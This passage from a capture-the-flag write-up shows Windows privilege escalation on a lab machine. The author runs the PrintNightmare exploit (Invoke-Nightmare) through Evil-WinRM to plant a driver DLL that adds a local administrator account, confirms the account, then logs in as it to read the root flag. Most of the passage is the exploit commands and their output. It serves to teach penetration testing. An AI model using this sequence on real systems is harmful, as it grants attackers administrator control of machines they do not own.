*Evil-WinRM* PS C:\Users\tony\Documents> Invoke-Nightmare -NewUser "0xdf" -NewPassword "0xdf0xdf"
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user 0xdf as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll

```

The output shows how it is writing a DLL file as a payload, and then loading it as a driver. This DLL just adds a user to the system as a local administrator. Then the script deletes the DLL.

Not only is 0xdf a user on the box, but also is in the Administrators group:

```
*Evil-WinRM* PS C:\Users\tony\Documents> net user 0xdf
User name                    0xdf
Full Name                    0xdf
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/19/2022 12:28:07 AM
Password expires             Never
Password changeable          1/19/2022 12:28:07 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.

```

#### WinRM

Connecting as the new user gives me access to the full filesystem:

```

oxdf@hacky$ evil-winrm -i 10.10.11.106 -u 0xdf -p 0xdf0xdf

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\0xdf\Documents> cd \users\administrator\desktop
*Evil-WinRM* PS C:\users\administrator\desktop> type root.txt
62984d12************************

```